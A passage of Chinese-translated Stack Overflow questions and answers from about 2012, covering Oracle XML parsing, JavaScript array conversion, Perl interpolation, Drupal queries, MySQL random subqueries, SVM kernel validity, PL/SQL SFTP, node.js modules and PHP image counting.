                <Value>
                    <value>Hu Mics Metab K</value>
                </Value>
            </valueArray>
        </Cell>
        <Cell>
            <columnId>8</columnId>
            <valueArray>
                <Value>
                    <value>2006-03-31</value>
                </Value>
            </valueArray>
        </Cell>
        <Cell>
            <columnId>7</columnId>
            <valueArray>
                <Value>
                    <value>2006-07-27</value>
                </Value>
            </valueArray>
        </Cell>
    </cellArray>
</Row> 
```

并希望解析这些数据并将其插入另一个名为“Hyp”的表中。每个数据对应于数据库表的列 id，其余为列值。我尝试过 Oracle XMLTYPE 解析器，它是

```
DECLARE
    indoc    VARCHAR2(2000);
    indomdoc DBMS_XMLDOM.DOMDocument;
    innode   DBMS_XMLDOM.DOMNode;
    myparser DBMS_XMLPARSER.parser;
    buf      VARCHAR2(2000);
BEGIN
    indoc := '<emp><name>De Selby</name></emp>';
    myParser := DBMS_XMLPARSER.newParser;
    DBMS_XMLPARSER.parseBuffer(myParser, indoc);
    indomdoc := DBMS_XMLPARSER.getDocument(myParser);
    innode := DBMS_XMLDOM.makeNode(indomdoc);
    DBMS_XMLDOM.writeToBuffer(innode, buf);
    DBMS_OUTPUT.put_line(buf);
    DBMS_XMLDOM.freeDocument(indomdoc);
    DBMS_XMLPARSER.freeParser(myParser);
END; 
```

但现在我想代替使用静态内容，即 De Selby 提供动态内容，即来自给出的“CLOBTABLE”xml，数据被解析并插入到“Hyp”表中。我不知道该怎么做。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-03T07:56:18.490

apex.oracle.com 有最后一个 apex 版本和 db 版本（即 11gR2 atm）。这允许使用 xmltables。

请注意，我必须将数据包装在标签中才能获得有效的 xml（否则它将作为主要元素，不解析）

```
DECLARE
l_xmlclob CLOB := 
'<data>
<Row>
  <cellArray>
    <Cell>
      <columnId>1</columnId>
      <valueArray>
        <Value>
          <value>IR000024575452</value>
        </Value>
      </valueArray>
    </Cell>
    <Cell>
      <columnId>5</columnId>
      <valueArray>
        <Value>
          <value>AZ12579856-001</value>
        </Value>
      </valueArray>
    </Cell>
  </cellArray>
</Row>
<Row>
  <cellArray>
    <Cell>
      <columnId>1</columnId>
      <valueArray>
        <Value>
          <value>IR000024575452</value>
        </Value>
      </valueArray>
    </Cell>
    <Cell>
      <columnId>5</columnId>
      <valueArray>
        <Value>
          <value>AZ12579856-001</value>
        </Value>
      </valueArray>
    </Cell>
  </cellArray>
</Row>
</data>';
BEGIN
   FOR r IN (  SELECT rownum rn, cells
               FROM xmltable('/data/Row' passing XMLTYPE(l_xmlclob)
                                         columns CELLS  XMLTYPE PATH './cellArray')
            )
   LOOP
      DBMS_OUTPUT.PUT_LINE('Row: '||r.rn);      

      FOR c IN ( SELECT colid, colval
                   FROM xmltable('/cellArray/Cell' passing r.cells
                                                   columns COLID NUMBER PATH './columnId',
                                                           COLVAL VARCHAR(20) PATH './valueArray/Value/value')
               )
      LOOP
         DBMS_OUTPUT.PUT_LINE('colid, col value: '||c.colid||', '||c.colval);
      END LOOP;
   END LOOP;
END; 
```

输出：

```
Row: 1
colid, col value: 1, IR000024575452
colid, col value: 5, AZ12579856-001
Row: 2
colid, col value: 1, IR000024575452
colid, col value: 5, AZ12579856-001 
```

说如果你想要实际的列，你可以试试这个：

```
 FOR r IN (  SELECT rownum rn, cells
               FROM xmltable('/data/Row' passing XMLTYPE(l_xmlclob)
                                         columns CELLS  XMLTYPE PATH './cellArray')
            )
   LOOP
      DBMS_OUTPUT.PUT_LINE('Row: '||r.rn);

      FOR c IN ( SELECT col1, col2, col3, col4, col5, col6
                   FROM xmltable('/cellArray/Cell' passing r.cells
                                                   columns COL1 VARCHAR(20) PATH './valueArray/Value/value[//columnId[contains(text(), "1")]]',
                                                           COL2 VARCHAR(20) PATH './valueArray/Value/value[//columnId[contains(text(), "2")]]',
                                                           COL3 VARCHAR(20) PATH './valueArray/Value/value[//columnId[contains(text(), "3")]]',
                                                           COL4 VARCHAR(20) PATH './valueArray/Value/value[//columnId[contains(text(), "4")]]',
                                                           COL5 VARCHAR(20) PATH './valueArray/Value/value[//columnId[contains(text(), "5")]]',
                                                           COL6 VARCHAR(20) PATH './valueArray/Value/value[//columnId[contains(text(), "6")]]'
                                                   )
               )
      LOOP
         DBMS_OUTPUT.PUT_LINE('col values: col1: '||c.col1||', col2: '||c.col2||', col3: '||c.col3||', col4: '||c.col4||', col5: '||c.col5||', col6: '||c.col6);
      END LOOP;
   END LOOP; 
```

输出：

```
Row: 1
col values: col1: IR000024575452, col2: , col3: , col4: , col5: , col6: 
col values: col1: , col2: , col3: , col4: , col5: AZ12579856-001, col6: 
Row: 2
col values: col1: IR000024575452, col2: , col3: , col4: , col5: , col6: 
col values: col1: , col2: , col3: , col4: , col5: AZ12579856-001, col6: 
```

不过请注意：您的值是一个奇怪的结构... valuearray>value>value？值包裹在值中，为什么单个单元格会有多个值（数组）？如果是这种情况，那么在您的 xml 中，您需要进行调整。

# javascript - 从数组中的每个字符串中删除引号 - Javascript

> ID：11782428
> 
> 赞同：4
> 
> 时间：2012-08-02T17:07:36.027
> 
> 标签：javascript

我在这里搜索过：[http](http://w3schools.com/jsref/default.asp) ://w3schools.com/jsref/default.asp但找不到任何方便的方法来执行此功能。如果我有一个数组`var arrayOfStrings = ["20","10","30","100"]`，有没有一种快速的方法可以从这个数组中的每个字符串中删除所有引号（“）而不必循环？

我基本上想创建这个：`var arrayOfNumbers = [20,10,30,100]`

谢谢

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-02T17:23:45.930

如果你想要数字转换，你可以这样做......

```
var arrayOfNumbers = arrayOfStrings.map(Number); 
```

该`.map()`方法创建一个新数组，其中填充了您提供的函数的返回值。

由于内置`Number`函数接受给定的第一个参数并将其转换为原始数字，因此它非常适合用作`.map()`. 请注意，它将十六进制表示法解释为有效数字。

* * *

另一个可以完成与回调相同的事情的内置函数是`parseFloat`.

```
var arrayOfNumbers = arrayOfStrings.map(parseFloat) 
```

然而，该`parseInt`函数将不起作用，因为还将每个成员`.map()`的当前*索引*`parseInt`传递给回调，并将尝试使用该数字作为*基数*参数。

* * *

*   [MDN Array.prototype.map](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/map) *（包括兼容性补丁）*

* * *

***演示：http:*** [//jsfiddle.net/UDWvH/](http://jsfiddle.net/UDWvH/)

```
[
    20,
    10,
    30,
    100
] 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-02T17:11:48.290

你可以这样尝试：

```
for(var i = 0; i < myArray.length; i++)
{
    myArray[i] = parseInt(myArray[i], 10);
} 
```

看看[parseInt 函数](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/parseInt)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:30:47.703

对于支持[JSON.parse](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/JSON/parse)的浏览器：

```
var arr = ["20","10","30","100"];
var newArr = JSON.parse("[" + arr.join() + "]");
console.log(typeof arr[0]);  //string
console.log(typeof newArr[0]);  //number 
```

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2012-08-02T17:12:34.243

你不需要做任何事情，JavaScript 中的双引号是标识符，表明其中的数据是一个字符串。这意味着它们不是数组或数据本身的一部分。

您可以使用标准的 For 循环进行循环。

# javascript - 如何在我的 javascript 模块中包含 jquery 而不会与全局命名空间冲突？

> ID：11782429
> 
> 赞同：1
> 
> 时间：2012-08-02T17:07:43.923
> 
> 标签：javascript, jquery

我正在开发一个 javascript 模块，我希望它是独立的。我还想使用 jQuery 提供的跨浏览器功能。如何在我的模块中包含 jQuery 而不会与潜在的用户包含的 jQuery 冲突？

有没有一种通用的方法可以做到这一点，这样我就可以将其他库添加到我的项目中而不会与全局命名空间发生冲突？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T19:34:56.947

我会尝试将所有 jQuery 复制到您的 JS 文件中并[在“无冲突”模式下运行它](http://api.jquery.com/jQuery.noConflict/)。然后，如果您将整个 JS 文件包装在一个[立即调用](http://tech.myemma.com/iifes-javascript-control-variable-scope/)的不带参数的函数表达式中，您的`$`变量将不会干扰全局范围。

因此，您的文件将类似于：

```
(function () {
    // all of jQuery goes here

    $.noConflict();
    var $ = jQuery.noConflict();

    // your code that uses $ here
})(); 
```

将所有内容包装在 IIFE 中将使您的`$`变量保持本地化，因此文件外的任何代码都无法触及它。这可能有点极端，但它应该有效。

## 编辑：我上面的解决方案是不正确的，因为我自己已经尝试过了。

您*真正*想要做的只是确保您的 jQuery 版本包含在您的用户之前。然后在您的代码中，代替或在您的代码中运行`var myJQ = jQuery.noConflict();`和使用。[请参阅此示例。](http://web.enavu.com/daily-tip/using-multiple-versions-of-jquery-on-the-same-page/)`myJQ``$``jQuery`

# string - 如何在 Perl 中连接变量

> ID：11782435
> 
> 赞同：7
> 
> 时间：2012-08-02T17:08:08.590
> 
> 标签：string, perl, concatenation, string-concatenation

在 Perl 中连接变量有不同的方法吗？

我不小心写了以下代码行：

```
print "$linenumber is: \n" . $linenumber; 
```

这导致输出如下：

```
22 is:
22 
```

我期待：

```
$linenumber is:
22 
```

所以我想知道。它必须将`$linenumber`双引号中的 解释为对变量的引用（太酷了！）。

使用这种方法有什么注意事项，它是如何工作的？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-02T17:10:50.490

使用双引号时会发生变量插值。因此，特殊字符需要转义。在这种情况下，您需要转义`$`：

```
print "\$linenumber is: \n" . $linenumber; 
```

它可以重写为：

```
print "\$linenumber is: \n$linenumber"; 
```

为避免字符串插值，请使用单引号：

```
print '$linenumber is: ' . "\n$linenumber";  # No need to escape `$` 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-10-23T08:42:50.940

我喜欢 `.=` 运算符方法：

```
#!/usr/bin/perl
use strict;
use warnings;

my $text .= "... contents ..."; # Append contents to the end of variable $text.
$text .= $text; # Append variable $text contents to variable $text contents.
print $text; # Prints "... contents ...... contents ..." 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-02T17:18:04.457

在 Perl 中，任何用双引号构建的字符串都将被插入，因此任何变量都将被其值替换。像许多其他语言一样，如果您需要打印 a `$`，您将不得不对其进行转义。

```
print "\$linenumber is:\n$linenumber"; 
```

或者

```
print "\$linenumber is:\n" . $linenumber; 
```

或者

```
printf "\$linenumber is:\n%s", $linenumber; 
```

[标量插值](http://www.linuxtopia.org/Perl_Programming/pickingUpPerl_28.html)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-02T17:20:11.960

如果您将代码从

```
print "$linenumber is: \n" . $linenumber; 
```

到

```
print '$linenumber is:' . "\n" . $linenumber; 
```

或者

```
print '$linenumber is:' . "\n$linenumber"; 
```

它会打印

```
$linenumber is:
22 
```

当想要打印变量名时，我发现有用的是使用单引号，这样其中的变量就不会被翻译成它们的值，从而使代码更容易阅读。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-02T17:08:08.590

在制定此响应时，我发现[此网页](http://www.devshed.com/c/a/Perl/Perl-Concatenating-Text-and-More/)解释了以下信息：

```
###################################################
#Note that when you have double quoted strings, you don't always need to concatenate. Observe this sample:

#!/usr/bin/perl

$a='Big ';
$b='Macs';
print 'I like to eat ' . $a . $b;

#This prints out:
#  I like to eat Big Macs

###################################################

#If we had used double quotes, we could have accomplished the same thing like this:

#!/usr/bin/perl

$a='Big ';
$b='Macs';
print "I like to eat $a $b";

#Printing this:
#  I like to eat Big Macs
#without having to use the concatenating operator (.).

###################################################

#Remember that single quotes do not interpret, so had you tried that method with single quotes, like this:

#!/usr/bin/perl

$a='Big ';
$b='Macs';
print 'I like to eat $a $b';
#Your result would have been:
#  I like to eat $a $b
#Which don't taste anywhere near as good. 
```

我认为这会对社区有所帮助，所以我提出这个问题并回答我自己的问题。其他有用的答案非常受欢迎！

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-08-02T17:09:54.480

您可以使用反斜杠`$`来逐字打印：

```
print "\$linenumber is: \n" . $linenumber; 
```

这打印出你所期望的。如果您不希望 Perl 插入变量名，您也可以使用单引号，但随后`"\n"`将按字面意思插入。

# php - 模板文件中的 Drupal 令牌替换

> ID：11782437
> 
> 赞同：6
> 
> 时间：2012-08-02T17:08:12.537
> 
> 标签：php, drupal-7, drupal-templates

我可以在 Drupal 模板文件中使用令牌替换吗？我正在尝试这个：

```
$author_uid = "[node:author:uid]";
$nid = "[node:nid]"; 
```

但它不起作用。如何在我的 node.tpl.php 模板中正确使用令牌替换？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-02T19:39:01.683

知道了！！这对我有用：

```
$author_uid = token_replace('[node:author:uid]', array('node' => $node));
$nid = token_replace('[node:nid]', array('node' => $node)); 
```

您必须将 $node 传递给 token_replace() 函数，然后您将获得所需的结果。希望这对某人有帮助！

# sql - 如何将 SELECT SQL 子查询与 RAND 结合使用？

> ID：11782439
> 
> 赞同：0
> 
> 时间：2012-08-02T17:08:12.530
> 
> 标签：sql, select, join, random, subquery

嗨，我正在尝试将一些查询合并为一个，但我不确定如何解决这个问题。我知道还有数百万其他示例，但我不知道如何将它们翻译成我的查询。

这是数据库。首先是表名：，然后是主键和外键

```
gallery:
    galleryID
    name
    addedDate

concert:
    concertID
    galleryID
    name
    URL
    addedDate

photo:
    photoID
    concertID
    name 
```

这是我的查询，它在随机情况下在 URL 上返回 NULL。我猜这是因为应该同时选择 ConcertID 和 URL。但是不允许有`SELECT concertID, URL FROM concert WHERE galleryID = g.galleryID ORDER BY RAND() LIMIT 1`那么我该如何解决这个问题？

除了在 URL 上获取 NULL 之外，我在第一个查询中选择的内容是正确的。所以我需要选择的是galleryID和addDate FROM gallery（每行1个galleryID不是8个相同），concertID和来自音乐会的URL（1个具有相同concertID的随机帖子），来自照片的名称（1个具有相同concertID的随机帖子）。给我这些结果：

```
11  2012-07-31 15:44:35 90  Picture\Path11  SomePicture28.jpg
36  2012-07-31 14:31:36 208 Picture\Path36  SomePicture11.jpg
09  2012-07-30 15:28:02 33  Picture\Path09  SomePicture69.jpg

SELECT galleryID, addedDate, 
    (SELECT concertID 
        FROM concert 
            WHERE galleryID = g.galleryID 
    ORDER BY RAND() LIMIT 1) AS curID, 
    (SELECT URL 
        FROM concert 
            WHERE concertID = curID) AS URL, 
    (SELECT p.name 
            FROM photo p, concert c 
                WHERE p.concertID = curID AND c.galleryID = g.galleryID 
     ORDER BY RAND() LIMIT 1) AS photoName 
FROM gallery g ORDER BY addedDate DESC LIMIT 8; 
```

我也尝试通过 JOIN 来执行此错误`#1054 - Unknown column 'p.concertID' in 'where clause'`

```
SELECT galleryID, addedDate, c.concertID, c.URL, p.name 
    FROM (SELECT concertID, URL, 
            (SELECT name 
                FROM photo 
                    WHERE p.concertID = curID.concertID 
             ORDER BY RAND() LIMIT 1) AS photoName 
             FROM concert 
                WHERE c.galleryID = curID.galleryID 
          ORDER BY RAND() LIMIT 1) curID 
LEFT JOIN concert c ON curID.galleryID = c.galleryID 
LEFT JOIN photo p ON p.name = curID.photoName 
ORDER BY addedDate DESC LIMIT 8; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T23:24:29.603

我在您的 SQL 中看不到任何原因为什么您的 URL 为空，它们是否都有值。

我已经用另一种格式重新完成了您的查询，这与您已经做的类似

```
SELECT R.*, c.URL, (SELECT p.Name FROM Photo p WHERE p.ConcertID = R.CurID ORDER BY RAND() LIMIT 1) AS PhotoName
FROM 
(SELECT GalleryID, AddedDate,(SELECT ConcertID FROM Concert c WHERE c.GalleryID = g.GalleryID ORDER BY RAND() LIMIT 1) AS CurID
FROM Gallery g
ORDER BY AddedDate DESC LIMIT 8) AS R
JOIN Concert c ON R.CurID = c.ConcertID 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T18:22:27.703

在您的查询中，您在“FROM”子句中有一个相关的子查询。从那里开始，事情变得越来越混乱。

看起来您正在尝试获取一张与音乐会相关的照片（在画廊中）。您可以通过将相关子查询移动到“SELECT”子句来做到这一点：

```
SELECT galleryID, addedDate, c.concertID, c.URL,
       (select name
        from photo p
        where p.concertID = c.concertId
        order by rand()
        limit 1
       ) photoname
FROM concert c left join
      gallery g
      ON g.galleryID = c.galleryID
ORDER BY addedDate DESC
LIMIT 8; 
```

要从 8 个不同的画廊获取 8 张照片，请尝试以下操作：

```
SELECT galleryID, addedDate, c.concertID, c.URL,
       (select name
        from photo p
        where p.concertID = c.concertId
        order by rand()
        limit 1
       ) photoname
FROM (select g.*
      from gallery g
      order by rand()
      limit 8
     ) g join
     concert c
     ON g.galleryID = c.galleryID
where c.concert_id =
          (select csub.concert_id
           from concert csub
           where csub.galleryID = g.galleryID
           order by rand()
           limit 1
          ) 
ORDER BY addedDate DESC 
```

# android - Android AdModAds NullpointerException

> ID：11782445
> 
> 赞同：3
> 
> 时间：2012-08-02T17:08:51.393
> 
> 标签：android, ads

我`AdModAdsView`在我的应用程序中添加了一个。它似乎工作....但是，在 Logcat 我有以下错误：

```
08-02 18:55:41.170: E/Ads(17498): An error occurred while destroying an AdWebView:
08-02 18:55:41.170: E/Ads(17498): java.lang.NullPointerException
08-02 18:55:41.170: E/Ads(17498):   at android.webkit.WebView.setWebViewClient(WebView.java:4361)
08-02 18:55:41.170: E/Ads(17498):   at     com.google.ads.internal.AdWebView.destroy(SourceFile:252)
08-02 18:55:41.170: E/Ads(17498):   at com.google.ads.internal.c$e.run(SourceFile:191)
08-02 18:55:41.170: E/Ads(17498):   at android.os.Handler.handleCallback(Handler.java:605)
08-02 18:55:41.170: E/Ads(17498):   at android.os.Handler.dispatchMessage(Handler.java:92)
08-02 18:55:41.170: E/Ads(17498):   at android.os.Looper.loop(Looper.java:137)
08-02 18:55:41.170: E/Ads(17498):   at android.app.ActivityThread.main(ActivityThread.java:4507)
08-02 18:55:41.170: E/Ads(17498):   at java.lang.reflect.Method.invokeNative(Native Method)
08-02 18:55:41.170: E/Ads(17498):   at java.lang.reflect.Method.invoke(Method.java:511)
08-02 18:55:41.170: E/Ads(17498):   at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:790)
08-02 18:55:41.170: E/Ads(17498):   at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:557)
08-02 18:55:41.170: E/Ads(17498):   at dalvik.system.NativeStart.main(Native Method) 
```

我遵循[了这个](https://developers.google.com/mobile-ads-sdk/docs/admob/fundamentals)指导方针。

```
 <com.google.ads.AdView
    xmlns:ads="http://schemas.android.com/apk/lib/com.google.ads"
    android:id="@+id/banner2"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    ads:adSize="BANNER"
    ads:adUnitId="a150183ee58a0ed"
    ads:loadAdOnCreate="true"
    android:orientation="vertical" >
</com.google.ads.AdView> 
```

# ios - 如何将 iPad 应用程序的数据导出到计算机？

> ID：11782446
> 
> 赞同：0
> 
> 时间：2012-08-02T17:08:55.253
> 
> 标签：ios

我有一个简单的调查 iPad 应用程序。数据保存在 TSV（制表符分隔文件）中。我正在寻找一种将此 TSV 文件导出到计算机的简单方法（如果可能，无需通过电子邮件发送，也无需通过 iTunes 进行操作）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T18:55:09.053

看看[IExplorer](http://www.macroplant.com/iexplorer/)。这是一个很棒的小程序/应用程序，可让您从计算机访问 iPad 的文件系统。您可以将任何文件从 iPad 拖放到计算机上。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:31:41.933

无法从连接的计算机直接访问 iOS 上的应用程序数据。不是说你可以直接将 iPad 的闪存盘挂载到电脑上，导航到应用的数据目录，然后将文件复制到电脑上。您必须拥有有权访问数据的东西。

一些选项是：

*   从 iPad 应用程序中通过电子邮件或其他方式“共享”数据。
*   使应用程序的数据可通过 iTunes 访问
*   将应用程序变成 FTP 客户端或服务器
*   Dropbox 集成（Apple 拒绝执行此操作的应用程序存在一些问题，但我不知道当前状态）

# machine-learning - 如何测试内核是否是有效内核

> ID：11782448
> 
> 赞同：13
> 
> 时间：2012-08-02T17:08:59.770
> 
> 标签：machine-learning, data-mining, svm

如果我定义自己的方法来确定我的支持向量机分类器的两个输入实体之间的相似性，从而将其定义为我的内核，我如何验证它是否确实是我可以使用的有效内核？

例如，如果我的输入是字符串，而我选择的内核可以说是某种字符串距离度量，我如何决定是否可以将它用于我的 SVM。我知道有效的 SVM 内核有一些条件。谁能告诉我它们是什么以及如何验证这些条件？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-04T00:24:05.983

最直接的测试基于以下内容：当且仅当任何特定数据点集的核矩阵具有所有非负特征值时，核函数才有效。您可以通过获取一组相当大的数据点并简单地检查它是否正确来轻松地对此进行测试。例如，如果您随机选择了 2000 个数据样本，创建了它们对应的 2000x2000 内核矩阵，并观察到它具有非负特征值，那么您很可能拥有一个合法内核。或者，如果存在任何负特征值，则候选核函数绝对不是合法核。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-08-02T17:47:44.547

内核函数必须满足[Mercer 的条件您也可以在](http://en.wikipedia.org/wiki/Mercer%27s_condition)[stats forum](https://stats.stackexchange.com/questions/23386/what-is-a-kernel-and-what-sets-it-apart-from-other-functions) 上找到您所问问题的答案 。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2016-06-06T22:40:55.343

您还可以查看[http://cs.nyu.edu/~dsontag/courses/ml12/slides/lecture6.pdf](http://cs.nyu.edu/~dsontag/courses/ml12/slides/lecture6.pdf)的参考资料，其中作者提供了根据上述陈述的“内核代数”——Mercer 定理对应的核矩阵是对称的半正定矩阵，正特征值由此而来。作者还举例说明了高斯函数是一个有效的内核。如果您不想查找参考，我将在此处提供： [![内核代数和高斯证明作为有效内核的描述](../Images/1adf14889b1689568ab52d987dea76a1.png)](https://i.stack.imgur.com/cPPCF.jpg)

# oracle - 如何在 Oracle 10g 数据库 (10.2.0.3) 上从 PLSQL SFTP CSV 文件

> ID：11782449
> 
> 赞同：0
> 
> 时间：2012-08-02T17:09:04.980
> 
> 标签：oracle, plsql, sftp

我的应用程序使用 UTL_FILE 生成一个 CSV 文件并将该文件写入数据库服务器位置，然后 SFTP 应将该文件传输到所需的共享位置。

第一部分已完成，第二部分需要帮助，即使用 PLSQL 的 SFTP

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:18:27.457

虽然完全可以使用该`UTL_TCP`包在 PL/SQL 中编写 SFTP 客户端，但这不太可能是一种实用的方法。一般来说，你有几个选择

1.  使用众多[Java SFTP 库](https://stackoverflow.com/questions/14617/java-what-is-the-best-way-to-sftp-a-file-from-a-server)之一创建 Java 存储过程，并从 PL/SQL 调用该 Java 存储过程。
2.  创建一个使用服务器的命令行实用程序执行 SFTP 的 shell 脚本，并使用`DBMS_SCHEDULER`或通过 Java 存储过程调用该 shell 脚本。

如果您的 Oracle 数据库在 Windows 上运行，您还可以在上述两个选项中的任何一个中编写一个 .Net 存储过程而不是 Java 存储过程。然而，Java 存储过程会更常见。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-10-25T08:38:57.030

如果您想尝试商业产品，您可以查看[ORA_SFTP](https://www.didisoft.com/ora-sftp/tutorial/)

您可以使用类似于此的代码块上传文件：

```
DECLARE 
 connection_id NUMBER; 
 private_key_handle BFILE;
 private_key BLOB; 
 PRIVATE_KEY_PASSWORD VARCHAR2(500); 
BEGIN
 DBMS_LOB.createtemporary(PRIVATE_KEY, TRUE);
 private_key_handle := BFILENAME('PGP_KEYS_DIR', 'test_putty_private.ppk'); -- directory name must be Upper case

 DBMS_LOB.OPEN(private_key_handle, DBMS_LOB.LOB_READONLY);
 DBMS_LOB.LoadFromFile( private_key, private_key_handle, DBMS_LOB.GETLENGTH(private_key_handle) );
 DBMS_LOB.CLOSE(private_key_handle);
 PRIVATE_KEY_PASSWORD := 'changeit';

 connection_id := ORA_SFTP.CONNECT_HOST('localhost', 22, 'nasko', private_key, private_key_password);

 -- upload the private key just for a demo
 ORA_SFTP.UPLOAD(connection_id, private_key, 'data.csv');

 ORA_SFTP.DISCONNECT_HOST(connection_id);
END;
/ 
```

*免责声明：我在滴滴软件工作*

# javascript - node.js 中的类方法

> ID：11782453
> 
> 赞同：11
> 
> 时间：2012-08-02T17:09:27.117
> 
> 标签：javascript, node.js, design-patterns

在过去的一个小时里，我一直在尝试使用 findOne、findOneOrCreate 等方法为 passport.js 编写用户模块，但无法正确完成。

用户.js

```
var User = function(db) {
  this.db = db;
}

User.prototype.findOne(email, password, fn) {
  // some code here
}

module.exports = exports = User; 
```

应用程序.js

```
User = require('./lib/User')(db);
User.findOne(email, pw, callback); 
```

我经历了几十个错误，主要是

```
TypeError: object is not a function 
```

或者

```
TypeError: Object function () {
  function User(db) {
    console.log(db);
  }
} has no method 'findOne' 
```

如何在不创建用户对象/实例的情况下创建具有这些功能的适当模块？

**更新**

我浏览了建议的解决方案：

```
var db;
function User(db) {
  this.db = db;
}
User.prototype.init = function(db) {
  return new User(db);
}
User.prototype.findOne = function(profile, fn) {}
module.exports = User; 
```

没运气。

```
TypeError: Object function User(db) {
  this.db = db;
} has no method 'init' 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-02T18:36:46.697

这里发生了几件事，我已经更正了您的源代码并添加了注释以进行解释：

**库/用户.js**

```
// much more concise declaration
function User(db) {
    this.db = db;
}

// You need to assign a new function here
User.prototype.findOne = function (email, password, fn) {
    // some code here
}

// no need to overwrite `exports` ... since you're replacing `module.exports` itself
module.exports = User; 
```

**应用程序.js**

```
// don't forget `var`
// also don't call the require as a function, it's the class "declaration" you use to create new instances
var User = require('./lib/User');

// create a new instance of the user "class"
var user = new User(db);

// call findOne as an instance method
user.findOne(email, pw, callback); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-02T17:13:57.010

你需要`new User(db)`在某个时候。

你可以做一个init方法

```
exports.init = function(db){
  return new User(db)
} 
```

然后从您的代码中：

```
var User = require(...).init(db); 
```

# mysql - 使用 $query->addExpression() 时如何保留要选择的字段的顺序

> ID：11782454
> 
> 赞同：2
> 
> 时间：2012-08-02T17:09:29.323
> 
> 标签：mysql, drupal-7, dynamic-queries

我正在使用 Drupal 7，我必须在多个表上建立一个联合。要使工会工作，必须满足一些条件：

1.  相同的列数
2.  相同的数据类型
3.  相同**的顺序**

一些表缺少一列，因此为了弥补这一点，我只需添加如下内容`$query->addExpression(':field_1', 'field_1', array(':field_1' => NULL));`：所以此时条件1&2都满足了，**但是**select中的字段顺序不同。

请参见下面的示例：

```
 $query_1 = db_select('table_one', 't1');
  $query_1->fields('t1', array('field_1', 'field_2'));

  $query_2 = db_select('table_two', 't2');
  if (true) {
    $query_2->fields('t2', array('field_1'));
  } else {
    $query_2->addExpression(':field_1', 'field_1', array(':field_1' => NULL));
  }
  $query_2->fields('t2', array('field_2'));        

  $query_3 = db_select('table_three', 't3');
  if (false) {
    $query_3->fields('t3', array('field_1'));
  } else {
    $query_3->addExpression(':field_1', 'field_1', array(':field_1' => NULL));
  }
  $query_3->fields('t3', array('field_2')); 
```

结果是：

```
// dpq($query_1);
SELECT t1.field_1 AS field_1, t1.field_2 AS field_2
FROM {table_one} t1

// dpq($query_2);
SELECT t2.field_1 AS field_1, t2.field_2 AS field_2
FROM {table_two} t2

// dpq($query_3);
SELECT t3.field_2 AS field_2, '' AS field_1
FROM {table_three} t3

// dpq($query_1->union($query_2)->union($query_3));
SELECT t1.field_1 AS field_1, t1.field_2 AS field_2
FROM {table_one} t1 
UNION SELECT t2.field_1 AS field_1, t2.field_2 AS field_2
FROM {table_two} t2 
UNION SELECT t3.field_2 AS field_2, '' AS field_1
FROM {table_three} t3 
```

似乎 using`$query->addExpression`不能保证该字段的位置是您期望的位置。`addExpression`查看已使用的第三个查询的转储。关于如何解决这个问题的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T08:44:57.877

这是我发现保持订单的唯一解决方法。即使该字段存在与否，也要使用表达式。这样，订单就是您所期望的：

```
if (TRUE) {
  // To keep the order of the fields we have to use this hacky way.
  // Use a function that will not modify the string
  $query->addExpression("IFNULL(table_name.field_name, '')", 'field_name_alias');
} else {
  $query->addExpression(':field', 'field_name_alias', array(':field' => NULL));
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-03-16T05:40:28.117

我想添加一个简化的示例。为了保持字段的顺序而不是

```
$query->addField('n', 'uid', 'node_uid'); 
```

你可以写

```
$query->addExpression('n.uid', 'node_uid'); 
```

# php - 使用 PHP 对特定子目录中的图像进行计数

> ID：11782455
> 
> 赞同：5
> 
> 时间：2012-08-02T17:09:32.000
> 
> 标签：php

我将图像存储在一个目录结构中，有点像这样：

*   图片
    *   富
        *   拇指
            *   awefawef.jpg
            *   dtyhtyh.jpg
        *   满的
            *   awefawef.jpg
            *   dtyhtyh.jpg
            *   eriguherg.jpg
    *   酒吧
        *   拇指
            *   尔格.jpg
        *   满的
            *   尔格.jpg
            *   tyjhr5g.jpg
    *   some_other_dir
    *   ETC ...

（注意：“拇指”目录中的图像数量并不总是与其相邻的“完整”目录中的图像数量相同。）

所以：**我需要使用 PHP 来计算所有“完整”目录中的图像总数。**

我确信我可以通过获取“图像”的所有子目录的列表来找到一种方法，然后循环浏览它们并计算每个“完整”文件夹中的图像。但是由于每个文件夹中将有数千个目录和数百个图像，因此我正在寻找最有效的解决方案 - 这将需要由站点经常完成。

这里最有效的方法是什么？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-02T18:50:13.003

这将适用于您概述的情况：

```
$imagecount = count(glob("images/*/full/*.jpg")); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-07-01T08:35:08.370

```
